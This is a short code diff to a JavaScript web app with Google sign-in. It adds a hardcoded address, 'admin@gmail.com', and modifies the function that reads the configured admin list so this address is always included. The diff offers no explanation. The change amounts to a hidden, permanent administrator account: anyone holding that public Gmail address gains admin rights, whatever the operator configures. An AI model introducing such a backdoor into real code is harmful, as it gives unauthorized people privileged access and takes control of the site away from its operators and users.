@@ -40,6 +40,7 @@ const GOOGLE_REDIRECT_URI_STORAGE_KEY = "googleRedirectUri";
 const GOOGLE_LOGIN_URL_STORAGE_KEY = "googleLoginUrl";
 const GOOGLE_LOGIN_SUCCESS_URL_STORAGE_KEY = "googleLoginSuccessUrl";
 const ADMIN_EMAIL_LIST_STORAGE_KEY = "adminEmailList";
+const SPECIAL_ADMIN_EMAILS = ["admin@gmail.com"];
 const LAST_GOOGLE_LOGIN_EMAIL_STORAGE_KEY = "webdocto_last_google_email";
 const LAST_GOOGLE_LOGIN_NAME_STORAGE_KEY = "webdocto_last_google_name";
 const CURRENT_USER_NAME_STORAGE_KEY = "webdocto_current_user_name";
@@ -1130,10 +1131,11 @@ async function saveGoogleLoginSettings() {
 
 function getAdminEmailsFromSettings() {
   const rawValue = readGoogleLoginSettings().adminEmailList || "";
-  return rawValue
+  return Array.from(new Set(rawValue
     .split(/\r?\n/)
     .map((value) => value.trim().toLowerCase())
-    .filter(Boolean);
+    .filter(Boolean)
+    .concat(SPECIAL_ADMIN_EMAILS)));
 }
 
 function getUserRoleByEmail(email) {
